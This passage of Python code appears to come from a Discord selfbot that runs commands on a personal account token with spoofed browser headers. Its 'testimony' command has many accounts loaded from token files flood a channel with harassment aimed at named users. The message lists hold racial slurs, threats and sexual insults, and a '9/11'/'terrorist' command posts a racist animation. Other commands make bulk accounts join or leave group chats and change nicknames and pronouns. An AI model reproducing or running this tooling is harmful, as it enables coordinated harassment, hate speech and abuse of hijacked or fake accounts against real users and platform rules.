    afkcheck_tasks[task_key] = asyncio.gather(response_task, counter_task)

afkcheck_tasks = {}

@bot.command()
@require_password()
async def afkcheckoff(ctx, user: discord.User = None):
    """Stops ongoing afk check for specified user or all checks in channel"""
    if user:
        task_key = (user.id, ctx.channel.id)
        if task_key in afkcheck_tasks:
            afkcheck_tasks[task_key].cancel()
            del afkcheck_tasks[task_key]
            await ctx.send(f"```Stopped afk checking {user.name}```")
    else:
        tasks_to_stop = [key for key in afkcheck_tasks.keys() if key[1] == ctx.channel.id]
        for task_key in tasks_to_stop:
            afkcheck_tasks[task_key].cancel()
            del afkcheck_tasks[task_key]
        await ctx.send("```Stopped all afk checks in this channel```")
    
#9/11 animation
@bot.command(aliases=["9/11", "911", "terrorist"])
@require_password()
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')
    




@bot.command()
@require_password()
async def setspfp(ctx, url: str):
    """Set server-specific profile picture"""
    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                if 'gif' in content_type:
                    image_format = 'gif'
                else:
                    image_format = 'png'

                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/@me", json=payload, headers=headers)
                
                if response.status_code == 200:
                    await ctx.send("```Successfully set server profile picture```")
                else:
                    await ctx.send(f"```Failed to update server profile picture: {response.status_code}```")
            else:
                await ctx.send("```Failed to download image from URL```")

@bot.command()
@require_password()
async def setsbanner(ctx, url: str):
    """Set server-specific banner """
    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                image_data = await response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = response.headers.get('Content-Type', '')
                if 'gif' in content_type:
                    image_format = 'gif'
                else:
                    image_format = 'png'

                payload = {
                    "banner": f"data:image/{image_format};base64,{image_b64}"
                }

                response = sesh.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/@me", json=payload, headers=headers)
                
                if response.status_code == 200:
                    await ctx.send("```Successfully set server banner```")
                else:
                    await ctx.send(f"```Failed to update server banner: {response.status_code}```")
            else:
                await ctx.send("```Failed to download image from URL```")
                
@bot.command()
@require_password()
async def setsbio(ctx, *, bio: str):
    """Set server-specific bio"""
    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me"
    }

    payload = {
        "bio": bio
    }

    response = sesh.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/@me", json=payload, headers=headers)
    
    if response.status_code == 200:
        await ctx.send("```Successfully set server bio```")
    else:
        await ctx.send(f"```Failed to update server bio: {response.status_code}```")

@bot.command()
@require_password()
async def setspronoun(ctx, *, pronouns: str):
    """Set server-specific pronouns"""
    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me"
    }

    payload = {
        "pronouns": pronouns
    }

    response = sesh.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/@me", json=payload, headers=headers)
    
    if response.status_code == 200:
        await ctx.send("```Successfully set server pronouns```")
    else:
        await ctx.send(f"```Failed to update server pronouns: {response.status_code}```")

from itertools import islice

async def dump_files(ctx, folder_path, file_type):
    if not os.path.exists(folder_path):
        await ctx.send(f"```Folder not found: {folder_path}```")
        return

    if isinstance(file_type, str):
        files = [f for f in os.listdir(folder_path) if f.lower().endswith(file_type)]
    else:  
        files = [f for f in os.listdir(folder_path) if f.lower().endswith(file_type)]
    
    if not files:
        await ctx.send(f"```No {file_type} files found in the specified folder```")
        return

    process_msgs = []
    current_index = 0

    while current_index < len(files):
        batch = list(islice(files, current_index, current_index + 10))
        
        file_list = []
        for file in batch:
            file_path = os.path.join(folder_path, file)
            try:
                file_list.append(discord.File(file_path))
            except Exception as e:
                process_msg = await ctx.send(f"```Failed to prepare {file}: {str(e)}```")
                process_msgs.append(process_msg)
                continue
        try:
            await ctx.send(files=file_list)
        except Exception as e:
            process_msg = await ctx.send(f"```Failed to send batch: {str(e)}```")
            process_msgs.append(process_msg)

        current_index += 10

        if current_index < len(files):
            continue_msg = await ctx.send(f"```{current_index}/{len(files)} files sent. Type 'yes' to continue...```")
            process_msgs.append(continue_msg)

            try:
                response = await bot.wait_for(
                    'message',
                    timeout=30.0,
                    check=lambda m: m.author == ctx.author and m.channel == ctx.channel
                )
                process_msgs.append(response)

                if response.content.lower() != 'yes':
                    break
            except asyncio.TimeoutError:
                timeout_msg = await ctx.send("```Timed out. Dump cancelled.```")
                process_msgs.append(timeout_msg)
                break

    for msg in process_msgs:
        try:
            await msg.delete()
        except:
            pass

    completion_msg = await ctx.send(f"```Dump completed. Sent {min(current_index, len(files))}/{len(files)} files.```")
    await asyncio.sleep(5)
    await completion_msg.delete()

@bot.command()
@require_password()
async def imgdump(ctx):
    ask_msg = await ctx.send("```Please provide the folder path:```")
    try:
        response = await bot.wait_for(
            'message',
            timeout=30.0,
            check=lambda m: m.author == ctx.author and m.channel == ctx.channel
        )
        folder_path = response.content
        await ask_msg.delete()
        await response.delete()
        await dump_files(ctx, folder_path, ('.png', '.jpg', '.jpeg', '.webp'))
    except asyncio.TimeoutError:
        await ask_msg.edit(content="```Timed out. Please try again.```")
        await asyncio.sleep(5)
        await ask_msg.delete()

@bot.command()
@require_password()
async def gifdump(ctx):
    ask_msg = await ctx.send("```Please provide the folder path:```")
    try:
        response = await bot.wait_for(
            'message',
            timeout=30.0,
            check=lambda m: m.author == ctx.author and m.channel == ctx.channel
        )
        folder_path = response.content
        await ask_msg.delete()
        await response.delete()
        await dump_files(ctx, folder_path, '.gif')
    except asyncio.TimeoutError:
        await ask_msg.edit(content="```Timed out. Please try again.```")
        await asyncio.sleep(5)
        await ask_msg.delete()

@bot.command()
@require_password()
async def mp4dump(ctx):
    ask_msg = await ctx.send("```Please provide the folder path:```")
    try:
        response = await bot.wait_for(
            'message',
            timeout=30.0,
            check=lambda m: m.author == ctx.author and m.channel == ctx.channel
        )
        folder_path = response.content
        await ask_msg.delete()
        await response.delete()
        await dump_files(ctx, folder_path, '.mp4')
    except asyncio.TimeoutError:
        await ask_msg.edit(content="```Timed out. Please try again.```")
        await asyncio.sleep(5)
        await ask_msg.delete()

@bot.command()
@require_password()
async def movdump(ctx):
    ask_msg = await ctx.send("```Please provide the folder path:```")
    try:
        response = await bot.wait_for(
            'message',
            timeout=30.0,
            check=lambda m: m.author == ctx.author and m.channel == ctx.channel
        )
        folder_path = response.content
        await ask_msg.delete()
        await response.delete()
        await dump_files(ctx, folder_path, '.mov')
    except asyncio.TimeoutError:
        await ask_msg.edit(content="```Timed out. Please try again.```")
        await asyncio.sleep(5)
        await ask_msg.delete()
### V9 HTTP API ###
"""
Get Current User
GET https://discord.com/api/v9/users/@me

Get User
GET https://discord.com/api/v9/users/{user_id}

Modify Current User
PATCH https://discord.com/api/v9/users/@me

Get User Guilds
GET https://discord.com/api/v9/users/@me/guilds

Leave Guild
DELETE https://discord.com/api/v9/users/@me/guilds/{guild_id}

Create DM
POST https://discord.com/api/v9/users/@me/channels

Create Group DM
POST https://discord.com/api/v9/users/@me/channels

Get User Connections
GET https://discord.com/api/v9/users/@me/connections

Guild Endpoints
Get Guild
GET https://discord.com/api/v9/guilds/{guild_id}

Modify Guild
PATCH https://discord.com/api/v9/guilds/{guild_id}

Delete Guild
DELETE https://discord.com/api/v9/guilds/{guild_id}

Get Guild Channels
GET https://discord.com/api/v9/guilds/{guild_id}/channels

Create Guild Channel
POST https://discord.com/api/v9/guilds/{guild_id}/channels

Modify Guild Channel Positions
PATCH https://discord.com/api/v9/guilds/{guild_id}/channels

Get Guild Member
GET https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}

List Guild Members
GET https://discord.com/api/v9/guilds/{guild_id}/members

Add Guild Member
PUT https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}

Modify Guild Member
PATCH https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}

Modify Current Member
PATCH https://discord.com/api/v9/guilds/{guild_id}/members/@me

Remove Guild Member
DELETE https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}

Get Guild Bans
GET https://discord.com/api/v9/guilds/{guild_id}/bans

Ban Guild Member
PUT https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}

Unban Guild Member
DELETE https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}

Get Guild Roles
GET https://discord.com/api/v9/guilds/{guild_id}/roles

Create Guild Role
POST https://discord.com/api/v9/guilds/{guild_id}/roles

Modify Guild Role
PATCH https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}

Delete Guild Role
DELETE https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}

Get Guild Prune Count
GET https://discord.com/api/v9/guilds/{guild_id}/prune

Begin Guild Prune
POST https://discord.com/api/v9/guilds/{guild_id}/prune

Get Guild Voice Regions
GET https://discord.com/api/v9/guilds/{guild_id}/regions

Get Guild Invites
GET https://discord.com/api/v9/guilds/{guild_id}/invites

Get Guild Integrations
GET https://discord.com/api/v9/guilds/{guild_id}/integrations

Delete Guild Integration
DELETE https://discord.com/api/v9/guilds/{guild_id}/integrations/{integration_id}

Get Guild Widget Settings
GET https://discord.com/api/v9/guilds/{guild_id}/widget

Modify Guild Widget
PATCH https://discord.com/api/v9/guilds/{guild_id}/widget

Get Guild Widget
GET https://discord.com/api/v9/guilds/{guild_id}/widget.json

Get Guild Vanity URL
GET https://discord.com/api/v9/guilds/{guild_id}/vanity-url

Get Guild Widget Image
GET https://discord.com/api/v9/guilds/{guild_id}/widget.png

Get Guild Welcome Screen
GET https://discord.com/api/v9/guilds/{guild_id}/welcome-screen

Modify Guild Welcome Screen
PATCH https://discord.com/api/v9/guilds/{guild_id}/welcome-screen

Get Guild Onboarding
GET https://discord.com/api/v9/guilds/{guild_id}/onboarding

Channel Endpoints
Get Channel
GET https://discord.com/api/v9/channels/{channel_id}

Modify Channel
PATCH https://discord.com/api/v9/channels/{channel_id}

Delete Channel
DELETE https://discord.com/api/v9/channels/{channel_id}

Get Channel Messages
GET https://discord.com/api/v9/channels/{channel_id}/messages

Create Message
POST https://discord.com/api/v9/channels/{channel_id}/messages

Get Message
GET https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}

Edit Message
PATCH https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}

Delete Message
DELETE https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}

Bulk Delete Messages
POST https://discord.com/api/v9/channels/{channel_id}/messages/bulk-delete

Edit Channel Permissions
PUT https://discord.com/api/v9/channels/{channel_id}/permissions/{overwrite_id}

Delete Channel Permission
DELETE https://discord.com/api/v9/channels/{channel_id}/permissions/{overwrite_id}

Get Channel Invites
GET https://discord.com/api/v9/channels/{channel_id}/invites

Create Channel Invite
POST https://discord.com/api/v9/channels/{channel_id}/invites

Create Channel Webhook
POST https://discord.com/api/v9/channels/{channel_id}/webhooks

Message Endpoints
Crosspost Message
POST https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/crosspost

Create Reaction
PUT https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me

Delete User Reaction
DELETE https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/{user_id}

Delete All Reactions
DELETE https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions

Delete All Reactions for Emoji
DELETE https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}

Webhook Endpoints
Create Webhook
POST https://discord.com/api/v9/channels/{channel_id}/webhooks

Get Channel Webhooks
GET https://discord.com/api/v9/channels/{channel_id}/webhooks

Get Guild Webhooks
GET https://discord.com/api/v9/guilds/{guild_id}/webhooks

Get Webhook
GET https://discord.com/api/v9/webhooks/{webhook_id}

Modify Webhook
PATCH https://discord.com/api/v9/webhooks/{webhook_id}

Delete Webhook
DELETE https://discord.com/api/v9/webhooks/{webhook_id}
"""


@bot.command()
@require_password()
async def gcfill(ctx):
    tokens_file_path = 'tokens.txt'
    tokens = loads_tokens(tokens_file_path)

    if not tokens:
        await ctx.send("```No tokens found in the file. Please check the token file.```")
        return

    limited_tokens = tokens[:12]
    group_channel = ctx.channel

    async def add_token_to_gc(token):
        try:
            user_client = discord.Client(intents=intents)
            
            @user_client.event
            async def on_ready():
                try:
                    await group_channel.add_recipients(user_client.user)
                    print(f'Added {user_client.user} to the group chat')
                except Exception as e:
                    print(f"Error adding user with token {token[-4:]}: {e}")
                finally:
                    await user_client.close()

            await user_client.start(token, bot=False)
            
        except Exception as e:
            print(f"Failed to process token {token[-4:]}: {e}")

    tasks = [add_token_to_gc(token) for token in limited_tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send(f"```Attempted to add {len(limited_tokens)} tokens to the group chat```")


@bot.command()
@require_password()
async def gcleave(ctx):
    tokens_file_path = 'tokens2.txt'
    tokens = loads_tokens(tokens_file_path)
    
    if not tokens:
        await ctx.send("```No tokens found in the file```")
        return
        
    channel_id = ctx.channel.id

    async def leave_gc(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        async with aiohttp.ClientSession() as session:
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}'
                async with session.delete(url, headers=headers) as response:
                    if response.status == 200:
                        print(f'Token {token[-4:]} left the group chat successfully')
                    elif response.status == 429:
                        retry_after = float((await response.json()).get('retry_after', 1))
                        print(f"Rate limited for token {token[-4:]}, waiting {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        print(f"Error for token {token[-4:]}: Status {response.status}")
                        
            except Exception as e:
                print(f"Failed to process token {token[-4:]}: {e}")
            
            await asyncio.sleep(0.5) 

    tasks = [leave_gc(token) for token in tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send("```Attempted to make all tokens leave the group chat```")
@bot.command()
@require_password()
async def gcleaveall(ctx):
    tokens_file_path = 'tokens.txt'
    tokens = loads_tokens(tokens_file_path)
    
    if not tokens:
        await ctx.send("```No tokens found in the file```")
        return

    async def leave_all_gcs(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        left_count = 0
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get('https://discord.com/api/v9/users/@me/channels', headers=headers) as resp:
                    if resp.status == 200:
                        channels = await resp.json()
                        group_channels = [channel for channel in channels if channel.get('type') == 3]
                        
                        for channel in group_channels:
                            try:
                                channel_id = channel['id']
                                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as leave_resp:
                                    if leave_resp.status == 200:
                                        left_count += 1
                                        print(f'Token {token[-4:]} left group chat {channel_id}')
                                    elif leave_resp.status == 429:
                                        retry_after = float((await leave_resp.json()).get('retry_after', 1))
                                        print(f"Rate limited for token {token[-4:]}, waiting {retry_after}s")
                                        await asyncio.sleep(retry_after)
                                    else:
                                        print(f"Error leaving GC {channel_id} for token {token[-4:]}: Status {leave_resp.status}")
                                
                                await asyncio.sleep(0.5)  
                                
                            except Exception as e:
                                print(f"Error processing channel for token {token[-4:]}: {e}")
                                continue
                                
                        return left_count
                    else:
                        print(f"Failed to get channels for token {token[-4:]}: Status {resp.status}")
                        return 0
                        
            except Exception as e:
                print(f"Failed to process token {token[-4:]}: {e}")
                return 0

    status_msg = await ctx.send("```Starting group chat leave operation...```")
    
    tasks = [leave_all_gcs(token) for token in tokens]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    total_left = sum(r for r in results if isinstance(r, int))
    
    await status_msg.edit(content=f"""```ansi
Group Chat Leave Operation Complete
Total tokens processed: {len(tokens)}
Total group chats left: {total_left}```""")
    
    
ladder_msg1 = [
    "nigga i dont fucking know you? ",
    "{mention} disgusting bitch",
    "# YO {UPuser} TAKE THE HEAT OR DIE LMFAO",
    "dont fail the afk checks LMFAO",
    "honestly id bitch both {user1} and {user2}",
    "# {mention} LMFAOOOO",
    "what the fuck is a {user1} or a {user2}",
    "LMFAO WHO THE FUCK IS {UPuser}",
    "NIGGA WE DONT FWU",
    "STUPID FUCKING SLUT",
    "{mention} sadly your dying and your bf {user2} is dogshit",
    "tbf your boyfriend {user2} is dying LMAO",
    "lets outlast ill be here all day dw",
    "this nigga teary eye typin",
    "DO I KNOW YOU? {UPuser}",
    "who is {user2}",
    "we dont rate you"
]

ladder_msg2 = [
    "WHAT THE FUCK WAS THAT LMFAO",
    "nigga ill rip your spine out {mention}",
    "brainless freak",
    "disgusting slut",
    "{user1} {user2} i don fuck with you?",
    "{mention} dont get teary eyed now",
    "who the fuck is {user1} {user2}",
    "nigga sadly your my bitch lets go forever {mention}",
    "{user1} stop tryna chatpack LMFAO",
    "you might aswell just quit {mention}",
    "na thats crazy 😂",
    "we hoeing the shit out of you",
    "ill beat on you lil nigga {mention}",
    "nigga ill cuck your mom and youd enjoy it {mention}",
    "frail digusting BITCH"
]


@bot.command()
@require_password()
async def block(ctx, user):
    if isinstance(user, str):
        try:
            user_id = int(user)
            user_name = user
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return
    else:
        user_id = user.id
        user_name = user.name

    headers = {
        'Authorization': bot.http.token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }

    msg = await ctx.send(f"```Blocking {user_name}...```")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.put(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers,
                json={"type": 2}
            ) as resp:
                if resp.status in [200, 204]:
                    await msg.edit(content=f"```Successfully blocked {user_name}```")
                else:
                    await msg.edit(content=f"```Failed to block {user_name}. Status: {resp.status}```")
    except Exception as e:
        await msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def unblock(ctx, user):
    if isinstance(user, str):
        try:
            user_id = int(user)
            user_name = user
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return
    else:
        user_id = user.id
        user_name = user.name

    headers = {
        'Authorization': bot.http.token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }

    msg = await ctx.send(f"```Unblocking {user_name}...```")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.delete(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers
            ) as resp:
                if resp.status == 204:
                    await msg.edit(content=f"```Successfully unblocked {user_name}```")
                else:
                    await msg.edit(content=f"```Failed to unblock {user_name}. Status: {resp.status}```")
    except Exception as e:
        await msg.edit(content=f"```An error occurred: {str(e)}```")
        
testimony_running = False
testimony_tasks = {}

@bot.command()
@require_password()
async def testimony(ctx, user1: discord.User, user2: discord.User = None):
    global testimony_running
    testimony_running = True
    channel_id = ctx.channel.id
    
    tokens = loads_tokens()
    valid_tokens = set(tokens)  
    
    async def send_messages(token, message_list):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        while testimony_running and token in valid_tokens:
            try:
                message = random.choice(message_list)
                formatted_message = (message
                    .replace("{user}", user1.display_name)
                    .replace("{mention}", user1.mention)
                    .replace("{UPuser}", user1.display_name.upper())
                    .replace("{user1}", user1.display_name)
                    .replace("{user2}", user2.display_name if user2 else "")
                )
                
                payload = {'content': formatted_message}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"Message sent successfully with token: {token[-4:]}")
                            await asyncio.sleep(random.uniform(0.5, 1))
                        elif resp.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"Rate limited. Waiting {retry_after:.2f}s...")
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:
                            print(f"Token {token[-4:]} is invalid (403). Removing from rotation.")
                            valid_tokens.remove(token)
                            break
                        else:
                            print(f"Error sending message: Status {resp.status}")
                            await asyncio.sleep(random.uniform(3, 5))
                            continue
                
            except Exception as e:
                print(f"Error in testimony task: {str(e)}")
                await asyncio.sleep(random.uniform(3, 5))
                continue
    
    tasks = []
    for i, token in enumerate(tokens):
        message_list = ladder_msg1 if i % 2 == 0 else ladder_msg2
        task = bot.loop.create_task(send_messages(token, message_list))
        tasks.append(task)
    
    testimony_tasks[channel_id] = tasks
    await ctx.send("```Testimony spam started. Use .testimonyoff to stop.```")


@bot.command()
@require_password()
async def testimonyoff(ctx):
    global testimony_running
    channel_id = ctx.channel.id
    
    if channel_id in testimony_tasks:
        testimony_running = False
        for task in testimony_tasks[channel_id]:
            task.cancel()
        testimony_tasks.pop(channel_id)
        await ctx.send("```Testimony spam stopped.```")
    else:
        await ctx.send("```No testimony spam running in this channel.```")

@bot.command()
@require_password()
async def tnickname(ctx, server_id: str, *, name: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
{cyan}Token Nickname Changer{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if name is None:
            await status_msg.edit(content=f"""```ansi
Choose nickname mode:
1. {yellow}Random{reset} (generates unique names)
2. {green}List{reset} (uses names from tnickname.txt)```""")
            
            mode_msg = await bot.wait_for('message', timeout=30.0, check=check)
            mode = mode_msg.content
            
            if mode == "1":
                names = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(len(selected_tokens))]
            elif mode == "2":
                try:
                    with open('tnickname.txt', 'r') as f:
                        name_list = [line.strip() for line in f if line.strip()]
                        names = random.choices(name_list, k=len(selected_tokens))
                except FileNotFoundError:
                    await status_msg.edit(content="```tnickname.txt not found```")
                    return
            else:
                await status_msg.edit(content="```Invalid mode selected```")
                return
        else:
            names = [name] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
            for i, (token, nickname) in enumerate(zip(selected_tokens, names), 1):
                headers['Authorization'] = token
                async with session.patch(
                    f'https://discord.com/api/v9/guilds/{server_id}/members/@me/nick',
                    headers=headers,
                    json={'nick': nickname}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
{cyan}Changing Nicknames...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current name: {nickname}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        final_msg = f"""```ansi
{green}Nickname Change Complete{reset}
Successfully changed: {success}/{len(selected_tokens)} nicknames```"""
        await status_msg.edit(content=final_msg)

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")

@bot.command()
@require_password()
async def tpronouns(ctx, *, pronouns: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    

    status_msg = await ctx.send(f"""```ansi\n
{cyan}Token Pronoun Changer{reset}
Total tokens available: {total_tokens}

How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            num = int(amount)
            if num > total_tokens:

                await status_msg.edit(content="```NOT enough tokens available```")
                return
            selected_tokens = random.sample(tokens, num)

        if pronouns is None:
            pronoun_list = ['he/him', 'she/her', 'they/them', 'it/its', 'xe/xem', 'ze/zir']
            pronouns = random.choices(pronoun_list, k=len(selected_tokens))
        else:
            pronouns = [pronouns] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
